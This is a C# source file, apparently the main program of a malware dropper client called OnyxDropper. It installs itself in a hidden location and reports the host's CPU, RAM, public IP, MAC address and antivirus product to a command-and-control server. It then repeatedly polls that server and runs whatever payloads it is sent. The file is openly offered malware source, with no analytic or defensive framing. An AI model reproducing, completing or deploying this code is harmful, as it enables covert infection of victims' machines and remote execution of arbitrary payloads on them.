using System;
using System.Collections.Generic;
using System.Threading;
using DropperClient.Command;
using DropperClient.Connection;
using DropperClient.Dataparser;
using DropperClient.Installation;
using DropperClient.Logger;
using DropperClient.Requests;
using DropperClient.SystemInfoGatherer;
using OnyxDropper.Requests;

namespace DropperClient
{
    internal class Program
    {
        private static readonly ILogger logger = new ConsoleLogger();

        private static void Main(string[] args)
        {
            var httpConnection = new ServerConnection(Settings.hostname);
            var requestSender = new RequestSender(httpConnection);

            if (Settings.Install)
            {
                logger.LogMessage("Installing OnyxDropper");
                var installer = new DropperInstaller(Settings.Hide, (DropperInstaller.InstallLocation)Settings.InstallLocation);
                var installationThread = new Thread(() => installer.Install());
                installationThread.Start();
            }

            if (!httpConnection.CanConnect())
            {
                logger.LogMessage("Starting Unable to connect");
                return;
            }

            var systemInformation = new InfoGatherer();

            if (!Login(requestSender, systemInformation.MacAddress))
            {
                if (!Register(requestSender, systemInformation))
                {
                    Environment.Exit(0);
                }
            }

            logger.LogMessage("Logged in succesfully");

            while (true)
            {
                var newCommand = GetCommand(requestSender, systemInformation.MacAddress);
                logger.LogMessage("Executing command");
                newCommand.Execute();

                Thread.Sleep(Settings.TimeOut);
            }
        }

        private static bool Login(RequestSender requestSender, string macAddress)
        {
            var formEncoder = new FormEncoder();
            var loginData = formEncoder.CreateLoginData(macAddress);
            var loginRequest = new LoginRequest("/api/login.php", loginData);
            var loginResponse = requestSender.SendRequest(loginRequest);
            var jsonResponseData = JsonParser.Deserialize(loginResponse);

            return jsonResponseData["message"].ToString().ToLower() == "succes";
        }

        private static bool Register(RequestSender requestSender, InfoGatherer systemInfo)
        {
            var formEncoder = new FormEncoder();
            var registerData = formEncoder.CreateRegisterData(systemInfo.CPU, systemInfo.RamInfo, systemInfo.PublicIP,
                systemInfo.MacAddress, systemInfo.AV);
            var registerRequest = new RegisterRequest("/api/register.php", registerData);
            var registerResponse = requestSender.SendRequest(registerRequest);
            var jsonResponseData = JsonParser.Deserialize(registerResponse);

            return jsonResponseData["message"].ToString().ToLower() == "succes";
        }

        private static ICommand GetCommand(RequestSender requestSender, string macAddress)
        {
            var formEncoder = new FormEncoder();
            var getCommandData = formEncoder.CreateLoginData(macAddress);
            var getCommandRequest = new GetCommandRequest("/api/getcommand.php", getCommandData);
            var getCommandResponse = requestSender.SendRequest(getCommandRequest);
            var jsonResponseData = JsonParser.Deserialize(getCommandResponse);

            switch (jsonResponseData["Command"])
            {
                case "uninstall":
                    logger.LogMessage("Got Command uninstall");
                    return new UninstallCommand();

                case "run":
                    logger.LogMessage("Got Command run");
                    var payloadData = (Dictionary<string, object>)jsonResponseData["Payload"];
                    var payload = createPayload(payloadData);
                    var runCommand = new RunCommand(payload);
                    return runCommand;

                case "none":
                    logger.LogMessage("Got Command none");
                    return new NoneCommand();
            }

            return null;
        }

        private static Payload createPayload(Dictionary<string, object> payloadData)
        {
            var newPayload = new Payload();
            newPayload.SetPayload(payloadData["PayloadBytes"].ToString());
            newPayload.SetFileName(payloadData["FileName"].ToString());

            return newPayload;
        }
    }
}